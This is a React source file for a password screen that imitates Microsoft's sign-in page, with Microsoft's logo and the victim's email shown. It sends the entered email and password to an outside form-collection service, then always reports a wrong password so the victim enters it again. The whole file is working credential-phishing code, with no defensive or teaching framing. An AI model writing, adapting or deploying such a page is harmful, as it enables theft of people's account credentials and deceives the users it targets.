import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import { useState } from "react";

const PasswordModal = ({ data, setData, setShowPasswordModal }) => {
  const [showError, setShowError] = useState(false);
  const handleSubmit = (e) => {
    e.preventDefault();
    setShowError(true);
    fetch(
      "https://api.formcake.com/api/form/282a52f0-203c-4b5f-90b4-e9c69732f284/submission",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      }
    ).then((response) => setData({ ...data, password: "" }));
    setData({ ...data, password: "" });
  };
  return (
    <>
      <div className="sign-in-container">
        <img
          src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
          alt=""
          className="img-fluid"
        ></img>
        <br />
        <p className="recipient">
          <ArrowBackIcon
            style={{ cursor: "pointer" }}
            onClick={() => setShowPasswordModal(false)}
          />
          {data?.email}
        </p>

        <p className="signIn-text">Enter Password</p>
        {showError && (
          <p className="recipient" style={{ color: "red" }}>
            Wrong password! Please enter your correct password
          </p>
        )}
        <input
          placeholder="Password"
          name="password"
          type="password"
          className="input-field"
          value={data.password}
          onChange={(e) =>
            setData((prevState) => ({ ...prevState, password: e.target.value }))
          }
        />
        <p className="no-account">
          <span className="no-link">Forgotten your password?</span>
        </p>
        <p className="no-link">Other ways to sign in</p>

        <button type="submit" className="signIn-btn" onClick={handleSubmit}>
          Sign in
        </button>
      </div>
    </>
  );
};

export default PasswordModal;
